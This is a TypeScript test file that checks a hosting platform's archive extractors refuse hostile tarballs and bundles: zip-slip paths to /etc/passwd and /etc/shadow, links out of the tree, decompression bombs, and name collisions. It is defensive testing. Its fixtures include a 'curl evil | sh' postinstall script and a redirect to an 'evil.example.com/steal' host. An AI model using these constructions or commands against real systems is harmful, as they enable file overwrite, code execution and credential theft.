/**
 * Threat class: malicious archives and bundles (PROD-OPS-08).
 *
 * Attacker model: a tenant (or a repository they control) supplies bytes that Zenith unpacks: a hosted app source
 * tarball, a GitHub codeload archive that becomes a build context, an analysis snapshot, a restore bundle and an export
 * artifact. Goals: write outside the destination (zip-slip), plant a link, exhaust memory or disk (decompression
 * bomb, entry flood), make disk differ from the approved digest (case or Unicode collisions, file/dir conflicts), or
 * smuggle a duplicate name.
 *
 * Each reader is driven only through its exported entry point with attacker-built bytes. The corpus is generated:
 * every hostile construction is applied to every reader that shares the construction, so a reader that lacks a
 * protection fails by name. The tar writer is the shared test-support writer; the hostile headers are patched on top.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import zlib from "node:zlib";
import { afterAll, describe, expect, it } from "vitest";
import { gzip, paxRecord, writeTar, type TarEntry } from "../_support/tar";
import { isolatedDataDir, removeDir } from "../hosted/_fixtures";

const dataDir = isolatedDataDir("zenith-adv-archives-");
afterAll(() => removeDir(dataDir));

const { validateSource, materializeSource, removeMaterialized } = await import("@/lib/hosted/source");
const { createSourceBundles } = await import("@/lib/platform/source-bundle");
const { snapshotFromTarball } = await import("@/lib/analysis/snapshot");
const { contextArchive } = await import("@/lib/providers/azure/release/context-archive");
const { packBundle, unpackBundle } = await import("@/lib/hosted/backup/bundle");
const { assertArtifactName } = await import("@/lib/portability/artifact");

const text = (s: string): Buffer => Buffer.from(s);
const MANIFEST = text('{"contract":1,"schema":1,"name":"adversarial"}');

/** A valid hosted source: the control for every refusal below. */
const hostedBase = (): TarEntry[] => [
  { path: "index.html", bytes: text("<!doctype html><title>x</title>") },
  { path: "zenith.app.json", bytes: MANIFEST },
  { path: "src/main.ts", bytes: text("export const x = 1;\n") },
];

/** Corrupt a header after writing: set a byte range and fix the checksum so only the intended property is wrong. */
function patchHeader(tar: Buffer, at: number, mutate: (header: Buffer) => void): Buffer {
  const copy = Buffer.from(tar);
  const header = copy.subarray(at, at + 512);
  mutate(header);
  header.fill(32, 148, 156);
  header.write(`${header.reduce((sum, b) => sum + b, 0).toString(8).padStart(6, "0")}\0 `, 148, 8);
  return copy;
}

interface Construction {
  name: string;
  /** Entries appended to a valid archive. */
  extra?: TarEntry[];
  /** Replace the whole entry list. */
  build?: () => Buffer;
}

/** Constructions every extractor must refuse. */
const HOSTILE: Construction[] = [
  { name: "zip-slip with ../ segments", extra: [{ path: "src/../../etc/passwd", bytes: text("x") }] },
  { name: "leading ..", extra: [{ path: "../escape.ts", bytes: text("x") }] },
  { name: "absolute path", extra: [{ path: "/etc/cron.d/x", bytes: text("x") }] },
  { name: "windows drive path", extra: [{ path: "C:/Windows/x.ts", bytes: text("x") }] },
  { name: "backslash traversal", extra: [{ path: "src\\..\\..\\x.ts", bytes: text("x") }] },
  { name: "NUL byte in name", extra: [{ path: "src/a\0.ts", bytes: text("x") }] },
  { name: "symlink out of the tree", extra: [{ path: "src/link", type: "symlink", linkname: "/etc/shadow" }] },
  { name: "symlink to parent", extra: [{ path: "src/up", type: "symlink", linkname: ".." }] },
  { name: "hard link to a sensitive file", extra: [{ path: "src/hl", type: "hardlink", linkname: "/etc/passwd" }] },
  { name: "character device", extra: [{ path: "src/dev", type: "chardev" }] },
  { name: "block device", extra: [{ path: "src/blk", type: "blockdev" }] },
  { name: "fifo", extra: [{ path: "src/fifo", type: "fifo" }] },
  { name: "gnu long link", extra: [{ path: "././@LongLink", type: "gnuLongLink", bytes: text("/etc/passwd\0") }] },
  { name: "pax path that traverses", extra: [{ path: "src/pax", type: "pax", bytes: paxRecord("path", "../../x") }, { path: "src/ok.ts", bytes: text("x") }] },
  { name: "pax linkpath", extra: [{ path: "src/pax", type: "pax", bytes: paxRecord("linkpath", "/etc/passwd") }, { path: "src/ok2.ts", bytes: text("x") }] },
];

describe("hosted app source upload (validateSource / materializeSource)", () => {
  it("accepts the control archive (the corpus is not refusing everything)", () => {
    const validated = validateSource({ kind: "tarball", bytes: gzip(writeTar(hostedBase())) });
    expect(validated.files.map((f) => f.path).sort()).toEqual(["index.html", "src/main.ts", "zenith.app.json"]);
  });

  it.each(HOSTILE.map((c) => [c.name, c] as const))("refuses %s", (_name, c) => {
    const tar = writeTar([...hostedBase(), ...(c.extra ?? [])]);
    expect(() => validateSource({ kind: "tarball", bytes: gzip(tar) })).toThrow();
    expect(() => validateSource({ kind: "tarball", bytes: tar })).toThrow();
  });

  it("refuses names that would collide on a case-insensitive or normalizing filesystem (disk must equal the digest)", () => {
    for (const [a, b] of [["src/A.ts", "src/a.ts"], ["src/Dir/x.ts", "src/dir/y.ts"], ["src/caf\u00e9.ts", "src/cafe\u0301.ts"]] as const) {
      const bytes = gzip(writeTar([...hostedBase(), { path: a, bytes: text("1") }, { path: b, bytes: text("2") }]));
      expect(() => validateSource({ kind: "tarball", bytes }), `${a} vs ${b}`).toThrow();
    }
  });

  it("refuses a path that is both a file and a directory, and files beneath a file", () => {
    const cases: TarEntry[][] = [
      [{ path: "src/a.ts", bytes: text("f") }, { path: "src/a.ts/b.ts", bytes: text("g") }],
      [{ path: "src/x", bytes: text("f") }, { path: "src/x/", type: "dir" }],
    ];
    for (const extra of cases) {
      expect(() => validateSource({ kind: "tarball", bytes: gzip(writeTar([...hostedBase(), ...extra])) })).toThrow();
    }
  });

  it("never reaches a raw filesystem error on a conflicting archive: the refusal is the validator's", () => {
    const bytes = gzip(writeTar([...hostedBase(), { path: "src/a.ts", bytes: text("f") }, { path: "src/a.ts/b.ts", bytes: text("g") }]));
    let caught: unknown;
    try { validateSource({ kind: "tarball", bytes }); } catch (error) { caught = error; }
    expect((caught as { code?: string }).code).toBe("unsupported_source");
  });

  it("refuses decompression bombs, oversize files, entry floods, deep and long paths", () => {
    const bomb = zlib.gzipSync(Buffer.alloc(64 * 1024 * 1024));
    expect(bomb.length).toBeLessThan(200 * 1024);
    expect(() => validateSource({ kind: "tarball", bytes: bomb })).toThrow();
    const bombTar = gzip(writeTar([...hostedBase(), { path: "public/big.txt", bytes: Buffer.alloc(3 * 1024 * 1024, 97) }]));
    expect(() => validateSource({ kind: "tarball", bytes: bombTar })).toThrow();
    const flood: TarEntry[] = Array.from({ length: 700 }, (_, i) => ({ path: `src/f${i}.ts`, bytes: text("x") }));
    expect(() => validateSource({ kind: "tarball", bytes: gzip(writeTar([...hostedBase(), ...flood])) })).toThrow();
    const deep = `src/${Array.from({ length: 14 }, (_, i) => `d${i}`).join("/")}/x.ts`;
    expect(() => validateSource({ kind: "tarball", bytes: gzip(writeTar([...hostedBase(), { path: deep.slice(0, 99), bytes: text("x") }])) })).toThrow();
    const long = `src/${"a".repeat(90)}.ts`;
    expect(() => validateSource({ kind: "tarball", bytes: gzip(writeTar([...hostedBase(), { path: "src/pax", type: "pax", bytes: paxRecord("path", `src/${"b".repeat(300)}.ts`) }, { path: long, bytes: text("x") }])) })).toThrow();
  });

  it("refuses truncated, checksum-corrupt and size-lying archives", () => {
    const tar = writeTar(hostedBase());
    expect(() => validateSource({ kind: "tarball", bytes: gzip(tar.subarray(0, tar.length - 700)) })).toThrow();
    expect(() => validateSource({ kind: "tarball", bytes: gzip(patchHeader(tar, 0, (h) => { h[0] = h[0]! ^ 1; }).fill(7, 148, 150)) })).toThrow();
    const lying = writeTar([{ path: "index.html", bytes: text("abc"), declaredSize: 4096 }, ...hostedBase().slice(1)]);
    expect(() => validateSource({ kind: "tarball", bytes: gzip(lying) })).toThrow();
    expect(() => validateSource({ kind: "tarball", bytes: Buffer.alloc(0) })).toThrow();
    expect(() => validateSource({ kind: "tarball", bytes: Buffer.from("not an archive at all") })).toThrow();
  });

  it("refuses build-configuration and secret-carrying paths the platform must supply itself", () => {
    for (const bad of [".env", "node_modules/x/index.js", "vite.config.ts", "package-lock.json", ".git/config", "tsconfig.json", "src/.env.local"]) {
      expect(() => validateSource({ kind: "tarball", bytes: gzip(writeTar([...hostedBase(), { path: bad, bytes: text("x") }])) }), bad).toThrow();
    }
    const withScripts = text(JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "curl evil | sh" } }));
    expect(() => validateSource({ kind: "tarball", bytes: gzip(writeTar([...hostedBase(), { path: "package.json", bytes: withScripts }])) })).toThrow();
  });

  it("materializes only inside its own directory", () => {
    const validated = validateSource({ kind: "tarball", bytes: gzip(writeTar(hostedBase())) });
    const dir = materializeSource(validated);
    try {
      const real = fs.realpathSync(dir);
      for (const file of validated.files) expect(path.relative(real, fs.realpathSync(path.join(dir, file.path))).startsWith("..")).toBe(false);
      expect(path.resolve(dir).startsWith(fs.realpathSync(os.tmpdir()))).toBe(true);
    } finally {
      removeMaterialized(dir);
    }
  });
});

describe("GitHub source bundle (createSourceBundles.read: the build-context path)", () => {
  const source = { repo: "https://github.com/acme/app.git", ref: "v1" };
  const base = (): TarEntry[] => [
    { path: "app-v1/", type: "dir" },
    { path: "app-v1/Dockerfile", bytes: text("FROM scratch\n") },
    { path: "app-v1/src/main.ts", bytes: text("x") },
  ];
  const reader = (tar: Buffer, limits?: Record<string, number>) =>
    createSourceBundles({ fetchImpl: (async () => new Response(new Uint8Array(zlib.gzipSync(tar)))) as typeof fetch, ...(limits ? { limits } : {}) });

  it("accepts the control archive", async () => {
    const bundle = await reader(writeTar(base())).read(source);
    expect(bundle.bytes).toBeGreaterThan(0);
    expect(bundle.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  const hostileInRoot: Construction[] = [
    ...HOSTILE.filter((c) => !c.name.startsWith("pax ")),
    { name: "second top-level directory", extra: [{ path: "other-root/evil.sh", bytes: text("x") }] },
    { name: "duplicate path", extra: [{ path: "app-v1/Dockerfile", bytes: text("FROM evil\n") }] },
    { name: "file under a file", extra: [{ path: "app-v1/src/main.ts/inner", bytes: text("x") }] },
  ];
  it.each(hostileInRoot.map((c) => [c.name, c] as const))("refuses %s", async (_name, c) => {
    // Re-root the generated paths under the archive's single top-level directory, as GitHub builds them.
    const extra = (c.extra ?? []).map((e) => (e.path.startsWith("other-root/") || e.path.startsWith("app-v1/") || e.path.startsWith("/") || e.path.startsWith("..") || e.path.startsWith("C:") || e.path.startsWith("src\\") ? e : { ...e, path: `app-v1/${e.path}` }));
    await expect(reader(writeTar([...base(), ...extra])).read(source)).rejects.toBeTruthy();
  });

  it("refuses a decompression bomb under its configured ceiling, an unterminated archive and trailing garbage", async () => {
    const big = writeTar([...base(), { path: "app-v1/blob.bin", bytes: Buffer.alloc(2 * 1024 * 1024, 1) }]);
    await expect(reader(big, { maxUnpackedBytes: 1024 * 1024 }).read(source)).rejects.toBeTruthy();
    await expect(reader(writeTar(base(), { terminate: false })).read(source)).rejects.toBeTruthy();
    await expect(reader(Buffer.concat([writeTar(base()), Buffer.from("hidden payload")])).read(source)).rejects.toBeTruthy();
  });

  it("refuses coordinates that would redirect the download (owner/repo/ref injection)", async () => {
    const r = reader(writeTar(base()));
    for (const bad of [
      { repo: "https://github.com/acme/app/../../evil/x", ref: "v1" },
      { repo: "https://evil.example.com/acme/app", ref: "v1" },
      { repo: "https://github.com/acme/app?x=1", ref: "v1" },
      { repo: "https://u:p@github.com/acme/app", ref: "v1" },
      { repo: "https://github.com/acme/app", ref: "../../x" },
      { repo: "https://github.com/acme/app", ref: "a/./b" },
      { repo: "https://github.com/acme/app", ref: "v1?x=1" },
      { repo: "https://github.com/acme/app", ref: "v1", dockerfile: "../../etc/passwd" },
      { repo: "https://github.com/acme/app", ref: "v1", dockerfile: "/etc/passwd" },
    ]) await expect(r.read(bad), JSON.stringify(bad)).rejects.toBeTruthy();
  });

  it("does not follow a redirect to a host outside the GitHub allowlist, and never forwards a token to it", async () => {
    const calls: { url: string; auth?: string }[] = [];
    const fetchImpl = (async (url: string, init?: RequestInit) => {
      calls.push({ url, auth: (init?.headers as Record<string, string> | undefined)?.Authorization });
      return new Response(null, { status: 302, headers: { location: "https://evil.example.com/steal" } });
    }) as unknown as typeof fetch;
    await expect(createSourceBundles({ fetchImpl }).read(source)).rejects.toBeTruthy();
    expect(calls.every((c) => !c.url.includes("evil.example.com"))).toBe(true);
  });
});

describe("analysis snapshot (snapshotFromTarball)", () => {
  it("keeps only safe regular files from a hostile archive and never throws on it", () => {
    const entries: TarEntry[] = [
      { path: "repo/ok.ts", bytes: text("export {}") },
      { path: "repo/../../escape.ts", bytes: text("x") },
      { path: "/abs/escape.ts", bytes: text("x") },
      { path: "repo/link", type: "symlink", linkname: "/etc/passwd" },
      { path: "repo/hard", type: "hardlink", linkname: "repo/ok.ts" },
      { path: "repo/dev", type: "chardev" },
      { path: "repo/ok.ts", bytes: text("OVERWRITE") },
    ];
    const snapshot = snapshotFromTarball(gzip(writeTar(entries)), {}, { stripComponents: 1 });
    const paths = snapshot.files.map((f) => f.path);
    expect(paths).toContain("ok.ts");
    expect(paths.filter((p) => /escape|link|hard|dev|\.\./.test(p))).toEqual([]);
    expect(snapshot.files.find((f) => f.path === "ok.ts")?.content).toBe("export {}");
  });

  it("bounds a decompression bomb and an entry flood by its limits", () => {
    const bomb = zlib.gzipSync(Buffer.alloc(32 * 1024 * 1024));
    const limited = snapshotFromTarball(bomb, { maxUncompressedBytes: 1024 * 1024 });
    expect(limited.truncated).toBe(true);
    const flood: TarEntry[] = Array.from({ length: 300 }, (_, i) => ({ path: `r/f${i}.txt`, bytes: text("x") }));
    expect(snapshotFromTarball(gzip(writeTar(flood)), { maxEntries: 50 }).files.length).toBeLessThanOrEqual(50);
  });
});

describe("Azure build-context re-pack (contextArchive)", () => {
  it.each([
    ["traversal", [{ path: "apps/web/../../x", bytes: text("x") }] as TarEntry[]],
    ["symlink", [{ path: "apps/web/l", type: "symlink", linkname: "/etc/passwd" }] as TarEntry[]],
    ["hard link", [{ path: "apps/web/h", type: "hardlink", linkname: "apps/web/Dockerfile" }] as TarEntry[]],
    ["duplicate", [{ path: "apps/web/Dockerfile", bytes: text("FROM evil") }] as TarEntry[]],
    ["absolute", [{ path: "/etc/x", bytes: text("x") }] as TarEntry[]],
  ])("refuses %s", (_name, extra) => {
    const tar = writeTar([{ path: "apps/web/Dockerfile", bytes: text("FROM scratch") }, ...extra]);
    expect(() => contextArchive(gzip(tar), "apps/web", "Dockerfile")).toThrow();
  });

  it("refuses a context directory that escapes the archive", () => {
    const tar = gzip(writeTar([{ path: "apps/web/Dockerfile", bytes: text("FROM scratch") }]));
    for (const dir of ["../x", "/abs", "a/../../b", "a\\b", "a//b", "a/./b"]) expect(() => contextArchive(tar, dir, "Dockerfile"), dir).toThrow();
  });
});

describe("backup restore container (unpackBundle)", () => {
  const draft = { format: "zenith.backup", createdAt: "2026-01-01T00:00:00.000Z" } as unknown as Parameters<typeof packBundle>[0];

  it("round-trips a control bundle (the control for the corruptions below)", () => {
    const { bytes } = packBundle(draft, [{ name: "control.sqlite", bytes: text("db") }, { name: "apps/a/data.sqlite", bytes: text("d2") }]);
    expect(unpackBundle(bytes).files.map((f) => f.name).sort()).toEqual(["apps/a/data.sqlite", "control.sqlite"]);
  });

  it("refuses unsafe entry names on both the pack and the unpack side", () => {
    for (const name of ["../x", "/abs", "a//b", "a/./b", "a/../b", "a\\b", ".hidden", "x\0y"]) {
      expect(() => packBundle(draft, [{ name, bytes: text("x") }]), name).toThrow();
    }
  });

  it("refuses a duplicated file entry even when the manifest count and table agree", () => {
    const { bytes } = packBundle(draft, [{ name: "a.txt", bytes: text("one") }, { name: "b.txt", bytes: text("two") }]);
    const manifestLength = bytes.readUInt32LE(5);
    const entriesAt = 9 + manifestLength;
    const firstEntry = bytes.subarray(entriesAt, entriesAt + 10 + 5 + 3);
    const secondEntry = bytes.subarray(entriesAt + firstEntry.length);
    // Replace b.txt with a second copy of a.txt: two files, two manifest rows, but only one name present.
    const forged = Buffer.concat([bytes.subarray(0, entriesAt), firstEntry, firstEntry]);
    expect(secondEntry.length).toBeGreaterThan(0);
    expect(() => unpackBundle(forged)).toThrow();
  });

  it("refuses truncation, garbage and a manifest without a file table", () => {
    const { bytes } = packBundle(draft, [{ name: "a.txt", bytes: text("one") }]);
    expect(() => unpackBundle(bytes.subarray(0, bytes.length - 2))).toThrow();
    expect(() => unpackBundle(Buffer.from("nope"))).toThrow();
    const noTable = Buffer.from(JSON.stringify({ format: "x" }));
    const head = Buffer.alloc(9);
    head.write("ZBK1", 0, "ascii");
    head.writeUInt8(1, 4);
    head.writeUInt32LE(noTable.length, 5);
    expect(() => unpackBundle(Buffer.concat([head, noTable]))).toThrow();
  });
});

describe("export artifact names (assertArtifactName)", () => {
  it("refuses traversal, aliasing and reserved names", () => {
    for (const name of ["../a", "a/../b", "/a", "a//b", "a/./b", "./a", "a/.", "a\\b", "manifest.json", "", "a\0b", `a/${"x".repeat(300)}`]) {
      expect(() => assertArtifactName(name), JSON.stringify(name)).toThrow();
    }
    expect(assertArtifactName("data/orders.csv")).toBe("data/orders.csv");
  });
});
